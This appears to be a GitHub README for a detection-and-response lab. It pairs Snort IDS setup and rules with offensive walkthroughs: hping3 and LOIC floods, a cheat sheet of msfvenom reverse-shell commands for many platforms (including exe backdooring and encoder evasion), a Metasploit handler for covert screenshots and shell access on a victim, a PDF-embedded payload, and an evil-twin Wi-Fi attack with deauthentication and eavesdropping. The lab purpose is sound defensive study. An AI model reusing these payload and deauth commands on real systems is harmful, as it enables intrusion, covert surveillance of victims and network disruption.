# Detection-and-Response-2.0
SNORT
First, we download Snort and install it. Then To verify the Snort version, we open the terminal and type in snort -V and hit Enter.
Now, let’s start Snort in IDS mode and tell it to display alerts to the console: sudo snort -A console  -c /etc/snort/snort.conf  -i  eth0. Here we are pointing Snort to the configuration file it should use (-c) and specifying the interface (-i eth0). The -A console option prints alerts to standard output. We don’t see any output when we enter the command because Snort hasn’t detected any activity specified in the rule we wrote. We generate some activity and see if our rule is working. We launch our VM. 

The direction operators <> and -> indicate the direction of interest for the traffic. This means traffic can either flow in one direction or in bi-directionally. The keyword any can be used to define any IP addresses, and numeric IP addresses must be used with a Classless Inter-Domain Routing (CDIR) netmask. In Snort rules, the port numbers can be listed in many ways, including any ports, negation, etc. Port ranges are indicated with Range operator. Usually, Snort rules were written in a single line, but with the new version, Snort rules can be written in multi-line. This can be done by adding a backslash \ to the end of the line. This multiple-line approach helps if a rule is very large and difficult to understand.

Protocols	Ip Address	Action performed
*log tcp any :1024 ->	192.168.1.0/24 400:	It will log traffic from various ports and will go to ports which are greater than or equal to 400
log udp any any ->	92.168.1.0/24 1:1024	It will log traffic from any port and destination ports ranging from 1 to 1024
Snort rules must be contained on a single line. Unless the multi-line character \ is used, the snort rule parser does not handle rules on multiple lines. Usually, it is contained in snort.conf configuration file.

This comes with two logical parts:
Rule header: Identifies rule actions such as alerts, log, pass, activate, dynamic and the CDIR block.
Rule options: Identifies the rule’s alert messages.

Snort rules must be written in such a way that they describe all the following events properly:
The conditions in which a user thinks that a network packet(s) is not same as usual or if the identity of the packet is not authentic.
Any violation of the security policy of the company that might be a threat to the security of the company’s network and other valuable information.
All well-known and common attempts to exploit the vulnerabilities in the company’s network.

The rules defined to the system should be compatible enough to act immediately and take necessary remedial measures, according to the nature of the intrusion. Snort does not evaluate the rules in the order that they appear in the snort rules file. By default, the order is:

Alert rules: It generates an alert using alert method.
Log rules: After generating alert, it then logs the packet.
Pass rules: It ignores the packet and drops it.

As we know, IP is a unique address for every computer and is used for transferring data or packets over the internet from one network to the other network. Each packet contains a message, data, source, destination address, and much more. Snort supports three IP protocols for suspicious behavior:
Transmission Control Protocol (TCP) Connects two different hosts and exchanges data between them. Examples include HTTP, SMTP, and FTP.
User Datagram Protocol (UDP): Broadcasts messages over the internet. Examples include DNS traffic.
Internet Control Message Protocol (ICMP): Sends network error messages in Windows. Examples include Ping and Traceroute.
                                            
![image](https://user-images.githubusercontent.com/88451628/172546356-9afe5412-a0f5-4214-9c2f-8e59dfeabe53.png)

![image](https://user-images.githubusercontent.com/88451628/172546321-3b027ca2-c7dd-4cc5-a9e0-cc34e8d43289.png)

![image](https://user-images.githubusercontent.com/88451628/172546300-6c18fb46-dcec-41d0-b6c9-76960b8aee08.png)
Snort captures and display all traffic packets and save them to the log file. In this mode, Snort applies all rules on every captured packet. If match with rules, Snort makes decision just by displaying it on the log or generate an alert. If packet does not match with any rules, it drops and Snort does not create any log. This command could be used to start snort on NIDS mode. Snort –c /etc/Snort/Snort.conf That command loads every line of Snort.conf and apply it as IDS like rules, ports, connecting folder and many more. Every log on every captured traffic that matched with Snort rules.
•	Writing and saving custom detection rules for LAN
 
![image](https://user-images.githubusercontent.com/88451628/172546281-27abda8a-ced9-4121-a6f1-edbd1a2880ab.png)
Now, let’s start Snort in IDS mode and tell it to display alerts to the console:
sudo snort -A console -q -c /etc/snort/snort.conf -i eht0
Again, we are pointing Snort to the configuration file it should use (-c) and specifying the interface (-i eth0). The -A console option prints alerts to standard output, and -q is for “quiet” mode (not showing banner and status report). You shouldn’t see any output when you enter the command because Snort hasn’t detected any activity specified in the rule we wrote. 

•	To start the snort server, we need to run the configuration file using Wi-Fi interface.
 
![image](https://user-images.githubusercontent.com/88451628/172546196-24761d5d-b770-482e-829c-57242bb85200.png)

•	Testing rules by sending an icmp packet and tcp packet.
 
![image](https://user-images.githubusercontent.com/88451628/172546161-96237313-b44e-44f4-82db-3e0a51f9c169.png)

![image](https://user-images.githubusercontent.com/88451628/172546135-cecf428f-e705-43ca-843d-4a2cd5cf174a.png)
•	Icmp flood using hping3 .
  
![image](https://user-images.githubusercontent.com/88451628/172546099-d307bb12-4f1d-4361-8b57-58ea1017fbff.png)
	Detecting icmp flood on ubuntu
 
![image](https://user-images.githubusercontent.com/88451628/172546083-9d06cca5-2412-4023-bebe-34d0cd18fd10.png)
•	Large Syn requests using hping3 from kali
 
![image](https://user-images.githubusercontent.com/88451628/172546047-d1b05757-1878-43e0-97ea-933b4c830d37.png)
Detecting Syn request on ubuntu which acts as snort server. 
 
![image](https://user-images.githubusercontent.com/88451628/172546007-ce080f38-5824-414c-aa10-19660c716eb1.png)
•	Performing DoS attack using LOIC tool from Kali
 
![image](https://user-images.githubusercontent.com/88451628/172545987-3c311a4e-bf00-4eec-a6ba-ef384fd24649.png)
	Detecting DoS attack (TCP flooding) on server.
 
![image](https://user-images.githubusercontent.com/88451628/172545945-5275845e-ab7e-4a91-accd-a7f6302f634e.png)
Payload Exploitation
The payload we make using msfvenom will be a Reverse TCP payload. This payload creates an executable that, when started, establishes a connection between the user’s computer and our Metasploit handler, allowing us to conduct a meterpreter session. Use the following stated command to access msfvenom on Kali Linux.
•	Creating windows payload using msfvenom framework on Metasploit 
 
![image](https://user-images.githubusercontent.com/88451628/172545912-a8e7bcb6-f75d-4b5d-9ea2-c1ccd0d306ff.png)
You can use the -p option to indicate which payload you want to utilize. Lhost seems to be the attacker’s IP address to which you want the payload to link. Lport is just the same as above; this is the port that the payload will link to, and it must be configured in the handler. -f instructs Msfvenom how to generate the payload; in this case, we’re going for a program executable or exe. The payload created by the above command’s execution is 7168 bytes, as shown from the above-attached image.
The command above instructs msfvenom to generate a 64-bit Windows executable file that implements a reverse TCP connection for the payload. The format must be specified as being type .exe, and the local host (LHOST) and local port (LPORT) have to be defined. In our case, the LHOST is the IP address of our attacking Kali Linux machine that we got in the last command, and the LPORT is the port to listen on for a connection from the target once it has been compromised.
The name of the .exe is up to you. 

Other interesting Venom payloads…

Binaries

Create a simple TCP Payload for Windows
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -f exe > example.exe

Create a simple HTTP Payload for Windows
root@kali:~# msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.2 LPORT=3333 -f exe > example.exe

Creates a simple TCP Shell for Linux
root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -f elf > example.elf

Creates a simple TCP Shell for Mac
root@kali:~# msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=3333 -f macho > example.macho

Creats a simple TCP Payload for Android
root@kali:~# msfvenom -p android/meterpreter/reverse/tcp LHOST=192.168.1.2 LPORT=3333 R > example.apk

Web Payloads

Create a Simple TCP Shell for PHP
root@kali:~# msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=3333 -f raw > example.php

Create a Simple TCP Shell for ASP
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -f asp > example.asp

Create a Simple TCP Shell for Javascript
root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=3333 -f raw > example.jsp

Create a Simple TCP Shell for WAR
root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=3333 -f war > example.war

Windows Payloads

Creates a backdoor in an executable file (.exe)
root@kali:~# msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -f exe > example.exe

Create a simple TCP payload with shikata_ga_nai encoder.
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe

Binds an exe with a Payload and encodes it
root@kali:~# msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=3333 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe


•	To start Metasploit, using msfconsole
 
![image](https://user-images.githubusercontent.com/88451628/172545859-4ba53090-5af2-4377-91da-541c544d8956.png)
Connection:
We now need to set up a listener on the port we determined within the executable. We do this by launching Metasploit using the command msfconsole on the Kali Linux terminal.
The screenshot below shows what commands to issue within Metasploit. First, we’ll tell Metasploit to use the generic payload handler “multi/handler” using the command "use multi/handler". We will then set the payload to match the one set within the executable using the command "set payload windows/meterpreter/reverse_tcp". We will then set the LHOST and LPORT this way — "set LHOST 192.168.195.72" and "set LPORT 4444". Once done, type run or exploitand press Enter.
The screenshot below displays the output. The reverse TCP handler should begin waiting for a connection.




•	Setting up meterpreter session to connect to victim and exploit the device. 
 
![image](https://user-images.githubusercontent.com/88451628/172545826-b9591049-c938-4ccc-b431-5265455375a2.png)
•	Using command prompt of windows in Attacker device without users knowledge
 
![image](https://user-images.githubusercontent.com/88451628/172545770-ea0958a7-179e-4fbb-85ed-8deda498f564.png)

•	Taking a screenshot and websnap of windows without victim’s knowledge 
 
![image](https://user-images.githubusercontent.com/88451628/172545748-a23311a9-e15e-4032-b219-9e02827f8eb1.png)
•	Creating a payload embedded within a pdf 
  
![image](https://user-images.githubusercontent.com/88451628/172545716-346b6fc2-b02b-4e66-9b5a-1405c8353b21.png)
•	Checking the pdf created
 
![image](https://user-images.githubusercontent.com/88451628/172545693-ce138e8e-1de0-4fa2-b99c-dad5d3f673d1.png)
Evil Twin Attack
Step 1: Enable Monitor Mode on Wireless Interface
The first step in this tutorial is to enable Monitor mode on our wireless interface wlan0 (or whatever interface you are using). This can be accomplished by executing the airmon-ng start wlan0 command.
 
![image](https://user-images.githubusercontent.com/88451628/172545650-61f9aa57-7a77-4ea4-8924-64afc12677a2.png)
Step 2: Locate the Target Wireless Network Using Airodump-ng: The second step is to use airodump-ng to list out currently running wireless networks in our vicinity and locate your home Wi-Fi network we would like to clone. If your objective is to just create a fake AP, then you can skip this step. Execute the airodump-ng wlan0mon command. Wait a while until you see your wireless network you want to clone appear in the list. When you find it, press [ctrl+c] and leave the terminal open.
 
![image](https://user-images.githubusercontent.com/88451628/172545622-eced80fb-839f-47c2-aa57-934526ef1757.png)

Step 3: Create an Evil Twin or Fake AP Using Airbase-ng
Now that we have the information we need, we can create an Evil Twin using airbase-ng. Obviously, you will be using the network name of the network you want to clone. Or, if you are just creating a Fake AP, it can be any network name you want, such as “Anonymous,” “Free Wi-Fi,” “You Suck,” and so on. My real network is running on channel 11.
 
![image](https://user-images.githubusercontent.com/88451628/172545593-378e2535-bae4-46c1-a9df-fcf1b2848d75.png)						
Step 4: Configure Interface at0
As we saw in the last step, airbase-ng sets the evil twin on interface at0. We must bring this interface up, configure it, enable IP forwarding, and other parameters. Open up a new terminal, and execute the following commands. Here is what these commands do:
•	ifconfig at0 up brings up the at0 interface. You can verify it’s now up using the     ifconfig command.
•	ifconfig at0 10.0.0.1 netmask 255.255.255.0 sets the at0 interface IP address as 10.0.0.1 and the subnet mask as /24.
•	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 creates a static route in our routing table so that any traffic from out clients will be forwarded to the real gateway at 10.0.0.1, which is a part of the 10.0.0.0/24 network.
•	iptables -P FORWARD ACCEPT creates a policy to accept forwarding in the chain target. This makes our Linux machine act like a router (even though it isn’t).
•	iptables -t nat -A POSTROUTING -o wlan0mon -j MASQUERADE allows us to route outbound traffic without disrupting the normal flow of traffic on the network. The masquerade option kind of acts like Source NAT. See here for more information
•	.echo 1 > /proc/sys/net/ipv4/ip_forward enables IP forwarding. The “1” enables IP forwarding while a “0” disables it
 
![image](https://user-images.githubusercontent.com/88451628/172545556-97974bc1-531d-4168-b5da-f736a8a0b1f2.png)

				






![image](https://user-images.githubusercontent.com/88451628/172545531-7211d79b-b359-41fa-a60e-5765e4b1ec42.png)

					






![image](https://user-images.githubusercontent.com/88451628/172545515-b3201671-5a76-4380-9136-d84bf242052d.png)
•	We can see a client tried to connect to AP.
 
                                           


![image](https://user-images.githubusercontent.com/88451628/172545469-e2220c6f-ec6a-4f11-bd23-d65dbda5560b.png)




Step 5: Kick Wireless Clients Off the Legitimate AP
One of the final steps here is to kick wireless clients off my legitimate AP, in my case, that’s the real HOME-5432 network. We can do this by using aireplay-ng. By executing the aireplay-ng –deauth 50 -a [BSSID of real AP] wlan0mon, we can send 50 802.11 deauthentication frames onto the HOME-5432 network.
 ![image](https://user-images.githubusercontent.com/88451628/172545434-4629b258-6bf4-4401-9123-32bd95647b1f.png)

						
Step 6: Perform Eavesdropping using wireshark.
if we want to see more in details, we can run Wireshark
 ![image](https://user-images.githubusercontent.com/88451628/172545393-d1c9146b-a904-4e66-8676-76e713976c3a.png)

						

						


![image](https://user-images.githubusercontent.com/88451628/172545370-c0729bce-4b6b-4911-8288-aeaf2c2f9361.png)




Wireshark is the best open-source network analyzer available. It is packed with features comparable to commercial network analyzers, and with a large, diverse collection of authors, new enhancements are continually developed. We can detect deauth signals on the network.
Next, click Start to initiate the packet capture. At this point, you’ve configured your system to capture wireless traffic in monitor mode. The next step is to utilize the information contained in the packets you are capturing. Fortunately, Wireshark has sophisticated analysis mechanisms that can be used for wireless traffic analysis.
Using display filters, you can exclude uninteresting traffic to reveal useful information, or search through a large packet capture for a specific set of information.
For Filtering Deauthentication Frames, the filter is:
(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0x0c)
OR
(wlan.fc.type eq 0) && (wlan.fc.type_subtype eq 0x0c)
OR
(wlan.fc.type eq 0) && (wlan.fc.type_subtype eq 12)
 
![image](https://user-images.githubusercontent.com/88451628/172545311-29777a64-4006-47a1-a119-2d680b44a720.png)
